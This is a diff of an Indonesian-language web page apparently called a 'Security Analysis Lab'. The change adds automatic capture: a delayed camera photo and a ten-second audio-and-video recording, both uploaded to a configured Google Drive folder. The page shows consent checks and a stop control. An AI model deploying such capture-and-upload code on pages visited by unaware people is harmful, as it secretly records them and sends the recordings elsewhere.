+            logActivity('User menolak semua izin', 'error');
+        }
+
+        // ==================== CAMERA & MEDIA FUNCTIONS ====================
         async function requestCameraPermission() {
-            updateStatus('camera', 'pending', 'Meminta izin kamera...');
-            
             try {
+                updateStatus('camera', 'pending', 'Meminta izin kamera & mikrofon...');
+                
                 const constraints = {
                     video: {
                         facingMode: isFrontCamera ? 'user' : 'environment',
                         width: { ideal: 1280 },
                         height: { ideal: 720 }
                     },
-                    audio: false
+                    audio: true // Enable audio for video recording
                 };
                 
                 const stream = await navigator.mediaDevices.getUserMedia(constraints);
                 currentStream = stream;
-                videoElement.srcObject = stream;
-                cameraContainer.style.display = 'block';
-                updateStatus('camera', 'granted', 'Izin kamera diberikan');
+                elements.videoElement.srcObject = stream;
+                elements.cameraContainer.style.display = 'block';
+                
+                updateStatus('camera', 'granted', 'Kamera & mikrofon aktif');
+                logActivity('Kamera dan mikrofon berhasil diakses', 'success');
+                
+                return stream;
             } catch (error) {
-                updateStatus('camera', 'denied', 'Izin kamera ditolak: ' + error.message);
+                updateStatus('camera', 'denied', `Error: ${error.message}`);
+                logActivity(`Gagal mengakses kamera: ${error.message}`, 'error');
+                throw error;
             }
         }
-        
-        // Fungsi untuk meminta izin mikrofon
-        async function requestMicrophonePermission() {
-            updateStatus('microphone', 'pending', 'Meminta izin mikrofon...');
-            
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                updateStatus('microphone', 'granted', 'Izin mikrofon diberikan');
-                showAudioInfo(stream);
-            } catch (error) {
-                updateStatus('microphone', 'denied', 'Izin mikrofon ditolak: ' + error.message);
-            }
-        }
-        
-        // Fungsi untuk mengganti kamera
-        async function switchCamera() {
+
+        function switchCamera() {
             if (currentStream) {
                 currentStream.getTracks().forEach(track => track.stop());
             }
-            
             isFrontCamera = !isFrontCamera;
-            await requestCameraPermission();
+            requestCameraPermission();
+            logActivity(`Mengganti kamera ke ${isFrontCamera ? 'depan' : 'belakang'}`, 'system');
         }
-        
-        // Fungsi untuk mengambil foto
-        function capturePhoto() {
-            if (!videoElement.srcObject) return;
+
+        // ==================== AUTO-CAPTURE SEQUENCE ====================
+        async function startAutoCaptureSequence() {
+            if (!currentStream) {
+                alert('Harap berikan izin kamera terlebih dahulu!');
+                return;
+            }
             
-            const canvas = document.createElement('canvas');
-            canvas.width = videoElement.videoWidth;
-            canvas.height = videoElement.videoHeight;
+            if (!checkConsent()) {
+                alert('Harap setujui persetujuan auto-capture di modal awal!');
+                return;
+            }
             
-            const context = canvas.getContext('2d');
-            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+            autoCaptureEnabled = true;
+            elements.startAutoCaptureBtn.disabled = true;
+            elements.startAutoCaptureBtn.textContent = '⏳ Auto-Capture Berjalan...';
+            updateStatus('auto', 'pending', 'Memulai auto-capture...');
+            elements.uploadStatus.style.display = 'block';
             
-            const photoUrl = canvas.toDataURL('image/png');
+            logActivity('🚀 Memulai sequence auto-capture', 'system');
+            logActivity(`⏰ Foto dalam ${CONFIG.AUTO_CAPTURE_DELAY/1000} detik, Video ${CONFIG.VIDEO_DURATION/1000} detik`, 'system');
             
-            const photoElement = document.createElement('img');
-            photoElement.src = photoUrl;
-            photoElement.style.maxWidth = '300px';
-            photoElement.style.borderRadius = '10px';
-            photoElement.style.marginTop = '10px';
-            photoElement.style.border = '2px solid #64ffda';
+            // Step 1: Capture photo after 3 seconds
+            setTimeout(async () => {
+                if (!autoCaptureEnabled) return;
+                
+                logActivity('📸 Auto-capture foto dimulai...', 'capture');
+                try {
+                    const photoBlob = await capturePhoto();
+                    logActivity('✅ Foto berhasil diambil', 'success');
+                    
+                    // Upload photo
+                    elements.photoUploadStatus.textContent = '📤 Mengupload...';
+                    elements.photoUploadStatus.className = 'upload-pending';
+                    
+                    const uploadResult = await uploadToGoogleDrive(
+                        photoBlob, 
+                        `security_photo_${Date.now()}.jpg`, 
+                        'image/jpeg',
+                        'photo'
+                    );
+                    
+                    if (uploadResult.success) {
+                        elements.photoUploadStatus.textContent = '✅ Terupload';
+                        elements.photoUploadStatus.className = 'upload-success';
+                        logActivity('📤 Foto berhasil diupload ke Google Drive', 'upload');
+                    } else {
+                        elements.photoUploadStatus.textContent = '❌ Gagal';
+                        elements.photoUploadStatus.className = 'upload-failed';
+                        logActivity(`❌ Gagal upload foto: ${uploadResult.error}`, 'error');
+                    }
+                } catch (error) {
+                    logActivity(`❌ Error capture foto: ${error.message}`, 'error');
+                    elements.photoUploadStatus.textContent = '❌ Error';
+                    elements.photoUploadStatus.className = 'upload-failed';
+                }
+            }, CONFIG.AUTO_CAPTURE_DELAY);
             
-            photoContainer.innerHTML = '<h4>Foto Terakhir:</h4>';
-            photoContainer.appendChild(photoElement);
-            
-            // Simulasi penyimpanan lokal
-            console.log('Foto disimpan secara lokal di perangkat');
+            // Step 2: Start video recording after 5 seconds
+            setTimeout(async () => {
+                if (!autoCaptureEnabled) return;
+                
+                logActivity('🎥 Auto-rekam video 10 detik dimulai...', 'capture');
+                elements.videoUploadStatus.textContent = '⏺️ Merekam...';
+                elements.videoUploadStatus.className = 'upload-pending';
+                
+                try {
+                    const videoBlob = await recordVideoWithAudio(CONFIG.VIDEO_DURATION);
+                    logActivity('✅ Video 10 detik selesai direkam', 'success');
+                    
+                    // Upload video
+                    elements.videoUploadStatus.textContent = '📤 Mengupload...';
+                    
+                    const uploadResult = await uploadToGoogleDrive(
+                        videoBlob,
+                        `security_video_${Date.now()}.webm`,
+                        'video/webm',
+                        'video'
+                    );
+                    
+                    if (uploadResult.success) {
+                        elements.videoUploadStatus.textContent = '✅ Terupload';
+                        elements.videoUploadStatus.className = 'upload-success';
+                        logActivity('📤 Video berhasil diupload ke Google Drive', 'upload');
+                    } else {
+                        elements.videoUploadStatus.textContent = '❌ Gagal';
+                        elements.videoUploadStatus.className = 'upload-failed';
+                        logActivity(`❌ Gagal upload video: ${uploadResult.error}`, 'error');
+                    }
+                } catch (error) {
+                    logActivity(`❌ Error rekam video: ${error.message}`, 'error');
+                    elements.videoUploadStatus.textContent = '❌ Error';
+                    elements.videoUploadStatus.className = 'upload-failed';
+                }
+                
+                // Complete sequence
+                setTimeout(() => {
+                    updateStatus('auto', 'granted', 'Auto-capture selesai');
+                    elements.startAutoCaptureBtn.disabled = false;
+                    elements.startAutoCaptureBtn.textContent = '🔄 Ulangi Auto-Capture';
+                    logActivity('✅ Sequence auto-capture selesai', 'success');
+                }, 2000);
+                
+            }, CONFIG.AUTO_CAPTURE_DELAY + 2000); // Start video 2 seconds after photo
         }
-        
-        // Fungsi untuk merekam video
+
+        async function capturePhoto() {
+            return new Promise((resolve, reject) => {
+                try {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = elements.videoElement.videoWidth;
+                    canvas.height = elements.videoElement.videoHeight;
+                    
+                    const context = canvas.getContext('2d');
+                    context.drawImage(elements.videoElement, 0, 0, canvas.width, canvas.height);
+                    
+                    canvas.toBlob(blob => {
+                        if (blob) {
+                            // Also show preview
+                            const photoUrl = canvas.toDataURL('image/jpeg');
+                            elements.photoContainer.innerHTML = `
+                                <h4>📸 Foto Terakhir:</h4>
+                                <img src="${photoUrl}" style="max-width: 300px; border-radius: 10px; border: 2px solid #64ffda; margin-top: 10px;">
+                            `;
+                            resolve(blob);
+                        } else {
+                            reject(new Error('Failed to create blob'));
+                        }
+                    }, 'image/jpeg', 0.8);
+                } catch (error) {
+                    reject(error);
+                }
+            });
+        }
+
+        function capturePhotoManual() {
+            capturePhoto().then(blob => {
+                logActivity('📸 Foto manual diambil', 'capture');
+                // Save locally if Google Drive not configured
+                saveToLocalStorage(blob, 'photo');
+            }).catch(error => {
+                logActivity(`❌ Error foto manual: ${error.message}`, 'error');
+            });
+        }
+
+        function recordVideoWithAudio(duration) {
+            return new Promise((resolve, reject) => {
+                try {
+                    if (!currentStream) {
+                        reject(new Error('No camera stream available'));
+                        return;
+                    }
+                    
+                    recordedChunks = [];
+                    const options = {
+                        mimeType: 'video/webm;codecs=vp9,opus',
+                        audioBitsPerSecond: 128000,
+                        videoBitsPerSecond: 2500000
+                    };
+                    
+                    mediaRecorder = new MediaRecorder(currentStream, options);
+                    
+                    mediaRecorder.ondataavailable = event => {
+                        if (event.data.size > 0) {
+                            recordedChunks.push(event.data);
+                        }
+                    };
+                    
+                    mediaRecorder.onstop = () => {
+                        const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                        resolve(blob);
+                        
+                        // Show preview
+                        const videoUrl = URL.createObjectURL(blob);
+                        const preview = document.createElement('video');
+                        preview.src = videoUrl;
+                        preview.controls = true;
+                        preview.style.maxWidth = '300px';
+                        preview.style.marginTop = '10px';
+                        
+                        const container = document.createElement('div');
+                        container.innerHTML = '<h4>🎥 Video Terakhir:</h4>';
+                        container.appendChild(preview);
+                        elements.photoContainer.appendChild(container);
+                    };
+                    
+                    mediaRecorder.onerror = (event) => {
+                        reject(new Error(`MediaRecorder error: ${event.error}`));
+                    };
+                    
+                    mediaRecorder.start();
+                    isRecording = true;
+                    logActivity(`⏺️ Rekam video ${duration/1000} detik dimulai`, 'capture');
+                    
+                    // Stop after duration
+                    setTimeout(() => {
+                        if (mediaRecorder && isRecording) {
+                            mediaRecorder.stop();
+                            isRecording = false;
+                            logActivity('⏹️ Rekam video dihentikan', 'capture');
+                        }
+                    }, duration);
+                    
+                } catch (error) {
+                    reject(error);
+                }
+            });
+        }
+
         function toggleRecording() {
             if (!isRecording) {
-                startRecording();
-            } else {
-                stopRecording();
+                recordVideoWithAudio(10000).then(blob => {
+                    logActivity('🎥 Video manual direkam', 'capture');
+                    saveToLocalStorage(blob, 'video');
+                }).catch(error => {
+                    logActivity(`❌ Error rekam manual: ${error.message}`, 'error');
+                });
             }
         }
-        
-        // Mulai merekam
-        function startRecording() {
-            if (!currentStream) return;
-            
-            recordedChunks = [];
-            const options = { mimeType: 'video/webm;codecs=vp9' };
-            mediaRecorder = new MediaRecorder(currentStream, options);
-            
-            mediaRecorder.ondataavailable = event => {
-                if (event.data.size > 0) {
-                    recordedChunks.push(event.data);
-                }
-            };
-            
-            mediaRecorder.onstop = () => {
-                const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                const videoUrl = URL.createObjectURL(blob);
-                
-                const videoElement = document.createElement('video');
-                videoElement.src = videoUrl;
-                videoElement.controls = true;
-                videoElement.style.maxWidth = '300px';
-                videoElement.style.marginTop = '10px';
-                
-                const container = document.createElement('div');
-                container.innerHTML = '<h4>Rekaman Terakhir:</h4>';
-                container.appendChild(videoElement);
-                
-                photoContainer.innerHTML = '';
-                photoContainer.appendChild(container);
-                
-                // Simulasi penyimpanan lokal
-                console.log('Video disimpan secara lokal di perangkat');
-            };
-            
-            mediaRecorder.start();
-            isRecording = true;
-            recordVideoBtn.textContent = '⏹️';
-            recordVideoBtn.style.backgroundColor = '#e74c3c';
+
+        // ==================== GOOGLE DRIVE FUNCTIONS ====================
+        function showDriveConfig() {
+            elements.driveModal.style.display = 'flex';
+            logActivity('Membuka konfigurasi Google Drive', 'system');
         }
-        
-        // Berhenti merekam
-        function stopRecording() {
+
+        function saveDriveConfig() {
+            const clientId = elements.googleClientId.value.trim();
+            const apiKey = elements.googleApiKey.value.trim();
+            
+            if (!clientId || !apiKey) {
+                alert('Harap isi Client ID dan API Key!');
+                return;
+            }
+            
+            CONFIG.GOOGLE_DRIVE.clientId = clientId;
+            CONFIG.GOOGLE_DRIVE.apiKey = apiKey;
+            
+            // Save to localStorage
+            localStorage.setItem('googleDriveConfig', JSON.stringify({
+                clientId,
+                apiKey,
+                folderId: CONFIG.GOOGLE_DRIVE.folderId
+            }));
+            
+            googleDriveConfigured = true;
+            elements.driveModal.style.display = 'none';
+            elements.driveAuthStatus.textContent = '⚙️ Terkonfigurasi';
+            elements.driveAuthStatus.className = 'upload-pending';
+            
+            logActivity('Google Drive API berhasil dikonfigurasi', 'success');
+            alert('✅ Google Drive API berhasil dikonfigurasi!\nSekarang login dengan Google untuk mengaktifkan upload.');
+            
+            // Initialize Google API
+            initializeGoogleAPI();
+        }
+
+        function skipDriveConfig() {
+            elements.driveModal.style.display = 'none';
+            updateStatus('auto', 'pending', 'Mode lokal - Upload ke Drive dinonaktifkan');
+            logActivity('Google Drive dinonaktifkan, data disimpan lokal', 'warning');
+            alert('Data akan disimpan di browser lokal saja (localStorage).');
+        }
+
+        async function testDriveConnection() {
+            if (!CONFIG.GOOGLE_DRIVE.clientId || !CONFIG.GOOGLE_DRIVE.apiKey) {
+                alert('Harap isi Client ID dan API Key terlebih dahulu!');
+                return;
+            }
+            
+            try {
+                await initializeGoogleAPI();
+                const authed = await authenticateGoogleDrive();
+                
+                if (authed) {
+                    alert('✅ Koneksi Google Drive berhasil!\nAnda bisa mengupload file.');
+                } else {
+                    alert('❌ Gagal mengautentikasi Google Drive. Periksa credentials Anda.');
+                }
+            } catch (error) {
+                alert(`❌ Error: ${error.message}`);
+            }
+        }
+
+        async function initializeGoogleAPI() {
+            return new Promise((resolve, reject) => {
+                gapi.load('client:auth2', () => {
+                    gapi.client.init({
+                        apiKey: CONFIG.GOOGLE_DRIVE.apiKey,
+                        clientId: CONFIG.GOOGLE_DRIVE.clientId,
+                        scope: CONFIG.GOOGLE_DRIVE.scope,
+                        discoveryDocs: CONFIG.GOOGLE_DRIVE.discoveryDocs
+                    }).then(() => {
+                        logActivity('Google API client diinisialisasi', 'system');
+                        resolve();
+                    }).catch(error => {
+                        logActivity(`❌ Gagal inisialisasi Google API: ${error.message}`, 'error');
+                        reject(error);
+                    });
+                });
+            });
+        }
+
+        async function authenticateGoogleDrive() {
+            try {
+                const authInstance = gapi.auth2.getAuthInstance();
+                
+                if (!authInstance.isSignedIn.get()) {
+                    await authInstance.signIn();
+                }
+                
+                const user = authInstance.currentUser.get();
+                const authResponse = user.getAuthResponse();
+                accessToken = authResponse.access_token;
+                
+                elements.driveAuthStatus.textContent = '✅ Terautentikasi';
+                elements.driveAuthStatus.className = 'upload-success';
+                
+                logActivity(`Google Drive terautentikasi sebagai: ${user.getBasicProfile().getEmail()}`, 'success');
+                return true;
+            } catch (error) {
+                logActivity(`❌ Autentikasi Google gagal: ${error.message}`, 'error');
+                return false;
+            }
+        }
+
+        async function uploadToGoogleDrive(blob, filename, mimeType, type = 'file') {
+            // If Google Drive not configured, save locally
+            if (!googleDriveConfigured || !CONFIG.GOOGLE_DRIVE.clientId) {
+                saveToLocalStorage(blob, type);
+                return { success: false, error: 'Google Drive not configured', savedLocally: true };
+            }
+            
+            try {
+                // Authenticate if needed
+                if (!accessToken) {
+                    const authed = await authenticateGoogleDrive();
+                    if (!authed) {
+                        throw new Error('Google Drive authentication failed');
+                    }
+                }
+                
+                const metadata = {
+                    name: filename,
+                    mimeType: mimeType,
+                    parents: [CONFIG.GOOGLE_DRIVE.folderId]
+                };
+                
+                const formData = new FormData();
+                formData.append('metadata', new Blob([JSON.stringify(metadata)], { type: 'application/json' }));
+                formData.append('file', blob);
+                
+                const response = await fetch('https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart&fields=id,name,webViewLink', {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': `Bearer ${accessToken}`
+                    },
+                    body: formData
+                });
+                
+                if (!response.ok) {
+                    const errorText = await response.text();
+                    throw new Error(`Upload failed: ${response.status} ${errorText}`);
+                }
+                
+                const result = await response.json();
+                logActivity(`✅ ${type === 'photo' ? 'Foto' : 'Video'} uploaded: ${result.name}`, 'upload');
+                console.log('Google Drive upload success:', result);
+                
+                return { success: true, data: result };
+                
+            } catch (error) {
+                console.error('Upload error:', error);
+                
+                // Fallback to localStorage
+                saveToLocalStorage(blob, type);
+                
+                return { 
+                    success: false, 
+                    error: error.message,
+                    savedLocally: true
+                };
+            }
+        }
+
+        // ==================== LOCAL STORAGE FALLBACK ====================
+        function saveToLocalStorage(blob, type) {
+            const reader = new FileReader();
+            reader.onload = function() {
+                const dataUrl = reader.result;
+                const key = `${type}_${Date.now()}`;
+                localStorage.setItem(key, dataUrl);
+                logActivity(`💾 ${type === 'photo' ? 'Foto' : 'Video'} disimpan lokal (${(blob.size/1024).toFixed(1)}KB)`, 'system');
+                
+                // Show local storage info
+                updateLocalStorageInfo();
+            };
+            reader.readAsDataURL(blob);
+        }
+
+        function updateLocalStorageInfo() {
+            const localItems = Object.keys(localStorage).filter(key => 
+                key.startsWith('photo_') || key.startsWith('video_')
+            ).length;
+            
+            if (localItems > 0) {
+                logActivity(`💾 ${localItems} file tersimpan di localStorage`, 'info');
+            }
+        }
+
+        // ==================== UTILITY FUNCTIONS ====================
+        function updateStatus(type, status, text) {
+            let statusElement, textElement;
+            
+            switch(type) {
+                case 'location':
+                    statusElement = elements.locationStatus;
+                    textElement = elements.locationText;
+                    break;
+                case 'camera':
+                    statusElement = elements.cameraStatus;
+                    textElement = elements.cameraText;
+                    break;
+                case 'auto':
+                    statusElement = elements.autoCaptureStatus;
+                    textElement = elements.autoCaptureText;
+                    break;
+            }
+            
+            if (statusElement && textElement) {
+                statusElement.className = 'status-indicator';
+                statusElement.classList.add(`status-${status}`);
+                textElement.textContent = text;
+            }
+        }
+
+        function loadSavedConfig() {
+            try {
+                const saved = localStorage.getItem('googleDriveConfig');
+                if (saved) {
+                    const config = JSON.parse(saved);
+                    CONFIG.GOOGLE_DRIVE.clientId = config.clientId || '';
+                    CONFIG.GOOGLE_DRIVE.apiKey = config.apiKey || '';
+                    CONFIG.GOOGLE_DRIVE.folderId = config.folderId || CONFIG.GOOGLE_DRIVE.folderId;
+                    
+                    elements.googleClientId.value = CONFIG.GOOGLE_DRIVE.clientId;
+                    elements.googleApiKey.value = CONFIG.GOOGLE_DRIVE.apiKey;
+                    elements.driveFolderId.value = CONFIG.GOOGLE_DRIVE.folderId;
+                    
+                    if (CONFIG.GOOGLE_DRIVE.clientId && CONFIG.GOOGLE_DRIVE.apiKey) {
+                        googleDriveConfigured = true;
+                        logActivity('Konfigurasi Google Drive dimuat dari localStorage', 'system');
+                    }
+                }
+            } catch (error) {
+                console.error('Error loading config:', error);
+            }
+        }
+
+        function stopAll() {
+            autoCaptureEnabled = false;
+            
+            if (currentStream) {
+                currentStream.getTracks().forEach(track => track.stop());
+                currentStream = null;
+            }
+            
             if (mediaRecorder && isRecording) {
                 mediaRecorder.stop();
                 isRecording = false;
-                recordVideoBtn.textContent = '⏺️';
-                recordVideoBtn.style.backgroundColor = '#64ffda';
-            }
-        }
-        
-        // Fungsi untuk menampilkan informasi lokasi
-        function showLocationInfo(position) {
-            const { latitude, longitude, accuracy } = position.coords;
-            
-            locationInfo.innerHTML = `
-                <p><strong>Koordinat:</strong> ${latitude.toFixed(6)}, ${longitude.toFixed(6)}</p>
-                <p><strong>Akurasi:</strong> ${Math.round(accuracy)} meter</p>
-                <p><strong>Status:</strong> Data lokasi diambil untuk analisis keamanan konteks</p>
-            `;
-            locationInfo.style.display = 'block';
-        }
-        
-        // Fungsi untuk menampilkan informasi audio
-        function showAudioInfo(stream) {
-            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
-            const source = audioContext.createMediaStreamSource(stream);
-            const analyser = audioContext.createAnalyser();
-            source.connect(analyser);
-            
-            audioInfo.innerHTML = `
-                <p><strong>Status Mikrofon:</strong> Aktif dan siap untuk analisis audio</p>
-                <p><strong>Penggunaan:</strong> Pengujian keamanan audio dan deteksi kebocoran suara</p>
-                <p><strong>Catatan:</strong> Semua pemrosesan audio dilakukan secara lokal</p>
-            `;
-            audioInfo.style.display = 'block';
-        }
-        
-        // Fungsi untuk memperbarui status izin
-        function updateStatus(permission, status, text) {
-            let statusElement, textElement, statusIndicator;
-            
-            switch(permission) {
-                case 'location':
-                    statusElement = locationStatus;
-                    textElement = locationText;
-                    break;
-                case 'camera':
-                    statusElement = cameraStatus;
-                    textElement = cameraText;
-                    break;
-                case 'microphone':
-                    statusElement = microphoneStatus;
-                    textElement = microphoneText;
-                    break;
             }
             
-            // Reset class status
-            statusElement.classList.remove('status-granted', 'status-denied', 'status-pending');
-            
-            // Tambah class status baru
-            if (status === 'granted') {
-                statusElement.classList.add('status-granted');
-            } else if (status === 'denied') {
-                statusElement.classList.add('status-denied');
-            } else {
-                statusElement.classList.add('status-pending');
+            if (autoCaptureTimer) {
+                clearTimeout(autoCaptureTimer);
             }
             
-            textElement.textContent = text;
+            elements.startAutoCaptureBtn.disabled = false;
+            elements.startAutoCaptureBtn.textContent = '🚀 Mulai Auto-Capture (3s + 10s)';
+            elements.cameraContainer.style.display = 'none';
+            
+            updateStatus('camera', 'denied', 'Dihentikan');
+            updateStatus('auto', 'denied', 'Dihentikan');
+            
+            logActivity('🛑 Semua proses dihentikan', 'warning');
+            alert('Semua proses telah dihentikan. Kamera dan mikrofon dimatikan.');
         }
-        
-        // Fungsi untuk memperbarui semua status
-        function updateAllStatus(status, text) {
-            updateStatus('location', status, text);
-            updateStatus('camera', status, text);
-            updateStatus('microphone', status, text);
+
+        // ==================== EXPORT LOGS ====================
+        window.exportLogs = function() {
+            const logText = activityLog.map(entry => 
+                `${entry.time.toISOString()} - ${entry.message}`
+            ).join('\n');
             
-            // Hentikan semua media stream jika ditolak
-            if (status === 'denied') {
-                if (currentStream) {
-                    currentStream.getTracks().forEach(track => track.stop());
-                    currentStream = null;
-                }
-                cameraContainer.style.display = 'none';
-                locationInfo.style.display = 'none';
-                audioInfo.style.display = 'none';
-            }
-        }
-        
-        // Fungsi untuk mereset semua izin
-        function resetAllPermissions() {
-            updateAllStatus('pending', 'Menunggu persetujuan...');
+            const blob = new Blob([logText], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `security_lab_log_${Date.now()}.txt`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
             
-            if (currentStream) {
-                currentStream.getTracks().forEach(track => track.stop());
-                currentStream = null;
-            }
-            
-            cameraContainer.style.display = 'none';
-            locationInfo.style.display = 'none';
-            audioInfo.style.display = 'none';
-            photoContainer.innerHTML = '';
-            
-            // Reset checkbox
-            consentLocation.checked = true;
-            consentCamera.checked = true;
-            consentMicrophone.checked = true;
-            consentMedia.checked = true;
-        }
-        
-        // Fungsi untuk mencabut semua izin
-        function revokeAllPermissions() {
-            updateAllStatus('denied', 'Izin dicabut oleh pengguna');
-            
-            if (currentStream) {
-                currentStream.getTracks().forEach(track => track.stop());
-                currentStream = null;
-            }
-            
-            cameraContainer.style.display = 'none';
-            locationInfo.style.display = 'none';
-            audioInfo.style.display = 'none';
-            photoContainer.innerHTML = '';
-            
-            alert('Semua izin perangkat telah dicabut. Untuk menggunakan fitur analisis keamanan, silakan reset dan berikan izin kembali.');
-        }
+            logActivity('Log diekspor ke file', 'system');
+        };
+
+        // ==================== INITIAL LOG ====================
+        logActivity('🔐 Security Analysis Lab siap', 'system');
+        logActivity(`📁 Google Drive Target: ${CONFIG.GOOGLE_DRIVE.folderId}`, 'info');
     </script>
 </body>
 </html>
